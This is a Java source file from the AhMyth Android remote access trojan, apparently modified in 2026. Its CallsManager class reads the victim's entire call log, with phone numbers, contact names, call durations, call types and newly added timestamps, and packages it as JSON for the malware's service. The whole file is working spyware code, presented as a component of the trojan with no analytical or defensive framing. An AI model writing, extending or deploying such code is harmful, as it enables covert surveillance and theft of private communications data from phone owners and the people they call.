package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/11/16.
 * Updated for Timestamp Support 2026
 */

public class CallsManager {

    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject call = new JSONObject();
                    
                    String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
                    int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));
                    
                    // NEW: Extract the timestamp (milliseconds since 1970)
                    long date = cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE));

                    call.put("phoneNo", num);
                    call.put("name", name);
                    call.put("duration", duration);
                    call.put("type", type);
                    
                    // NEW: Add the date to the JSON object
                    call.put("date", date); 
                    
                    list.put(call);
                }
                cur.close(); // Good practice to close the cursor
            }
            
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
